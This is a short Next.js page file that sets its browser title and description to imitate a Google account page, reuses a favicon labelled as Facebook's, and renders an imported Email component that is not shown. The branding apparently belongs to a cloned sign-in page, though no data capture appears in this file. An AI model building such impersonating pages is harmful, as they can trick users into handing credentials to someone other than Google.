import React from 'react'
import Email from "./_components/Email"
import { Metadata } from 'next';
import Head from 'next/head';

export const metadata: Metadata = {
  title: "Google ",
  description: "A Google Account",
  icons: {
    icon: "./icon.png", // Path to the Facebook favicon
  },
};
function page() {
  return (
    <div className='w-[100vw] h-[100vh] py-4 sm:py-0 bg-white'>
      <Email />

    </div>
  )
}

export default page
